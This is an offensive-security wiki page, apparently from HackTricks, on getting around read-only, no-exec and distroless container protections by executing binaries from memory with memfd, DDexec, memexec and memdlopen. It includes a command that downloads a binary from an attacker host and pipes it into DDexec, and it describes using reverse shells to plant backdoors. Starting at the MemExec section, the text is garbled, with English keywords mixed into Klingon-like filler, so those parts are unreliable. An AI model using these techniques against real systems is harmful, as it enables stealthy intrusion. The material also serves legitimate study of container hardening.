# Bypass FS protections: read-only / no-exec / Distroless

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Videos

In the following videos you can find the techniques mentioned in this page explained more in depth:

* [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4)
* [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM\_gjjiARaU)

## read-only / no-exec scenario

It's more and more common to find linux machines mounted with **read-only (ro) file system protection**, specially in containers. This is because to run a container with ro file system is as easy as setting **`readOnlyRootFilesystem: true`** in the `securitycontext`:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

However, even if the file system is mounted as ro, **`/dev/shm`** will still be writable, so it's fake we cannot write anything in the disk. However, this folder will be **mounted with no-exec protection**, so if you download a binary here you **won't be able to execute it**.

{% hint style="warning" %}
From a red team perspective, this makes **complicated to download and execute** binaries that aren't in the system already (like backdoors o enumerators like `kubectl`).
{% endhint %}

## Easiest bypass: Scripts

Note that I mentioned binaries, you can **execute any script** as long as the interpreter is inside the machine, like a **shell script** if `sh` is present or a **python** **script** if `python` is installed.

However, this isn't just enough to execute your binary backdoor or other binary tools you might need to run.

## Memory Bypasses

If you want to execute a binary but the file system isn't allowing that, the best way to do so is by **executing it from memory**, as the **protections doesn't apply in there**.

### FD + exec syscall bypass

If you have some powerful script engines inside the machine, such as **Python**, **Perl**, or **Ruby** you could download the binary to execute from memory, store it in a memory file descriptor (`create_memfd` syscall), which isn't going to be protected by those protections and then call a **`exec` syscall** indicating the **fd as the file to execute**.

For this you can easily use the project [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec). You can pass it a binary and it will generate a script in the indicated language with the **binary compressed and b64 encoded** with the instructions to **decode and decompress it** in a **fd** created calling `create_memfd` syscall and a call to the **exec** syscall to run it.

{% hint style="warning" %}
This doesn't work in other scripting languages like PHP or Node because they don't have any d**efault way to call raw syscalls** from a script, so it's not possible to call `create_memfd` to create the **memory fd** to store the binary.

Moreover, creating a **regular fd** with a file in `/dev/shm` won't work, as you won't be allowed to run it because the **no-exec protection** will apply.
{% endhint %}

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) is a technique that allows you to **modify the memory your own process** by overwriting its **`/proc/self/mem`**.

Therefore, **controlling the assembly code** that is being executed by the process, you can write a **shellcode** and "mutate" the process to **execute any arbitrary code**.

{% hint style="success" %}
**DDexec / EverythingExec** will allow you to load and **execute** your own **shellcode** or **any binary** from **memory**.
{% endhint %}
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
### MemExec

[**Memexec**](https://github.com/arget13/memexec) jImejDaq **DDexec**. **DDexec shellcode demonised** vItlhutlh, **binary vItlhutlh** run **bI'rel** **DDexec** vItlhutlh, **memexec shellcode** run **bI'rel** **communicate**.

**memexec to execute binaries from a PHP reverse shell** [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php) **example**.

### Memdlopen

**memdlopen** [**memdlopen**](https://github.com/arget13/memdlopen) technique **load binaries** **easier way** **execute**. **load binaries with dependencies** **allow**.

## Distroless Bypass

### Distroless vItlhutlh

Distroless containers **bare minimum components necessary to run a specific application or service** vItlhutlh, **libraries and runtime dependencies** vItlhutlh, **package manager, shell, or system utilities** vItlhutlh.

Distroless containers **reduce the attack surface of containers by eliminating unnecessary components** **minimising the number of vulnerabilities that can be exploited**.

### Reverse Shell

Distroless container **`sh` or `bash`** **find**. **ls**, **whoami**, **id**... **binaries** **find**.

{% hint style="warning" %}
**reverse shell** **enumerate** **system** **able**.
{% endhint %}

**compromised container** **flask web** run, **python** **installed**, **Python reverse shell** **grab**. **node** run, **Node rev shell** **grab**, **scripting language** **grab**.

{% hint style="success" %}
**scripting language** **enumerate the system** **use**.
{% endhint %}

**`read-only/no-exec`** **protections** **abuse** **reverse shell** **write in the file system your binaries** **execute**.

{% hint style="success" %}
**kind of containers** **protections** **usually exist**, **previous memory execution techniques to bypass them** **use**.
{% endhint %}

**exploit some RCE vulnerabilities** **reverse shells** **execute binaries from memory** **examples** [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
